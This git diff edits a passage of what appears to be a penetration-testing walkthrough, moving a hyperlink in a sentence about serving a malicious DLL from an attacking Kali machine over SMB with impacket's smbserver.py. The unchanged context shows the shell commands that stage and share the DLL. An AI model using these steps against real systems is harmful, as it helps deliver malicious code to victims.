@@ -678,7 +678,7 @@ Final size of dll file: 5120 bytes
 ```
   
   
-Next, we share the malicious DLL from our attacking machine via SMB (we can do this easily by using [impacket's smbserver.py](https://github.com/SecureAuthCorp/impacket)):
+Next, we share the malicious DLL from our attacking machine via SMB (we can do this easily by using [impacket's](https://github.com/SecureAuthCorp/impacket) smbserver.py):
 ```
 kali@kali:~$ mkdir smb;cp plugin.dll smb
 kali@kali:~$ sudo smbserver.py share smb
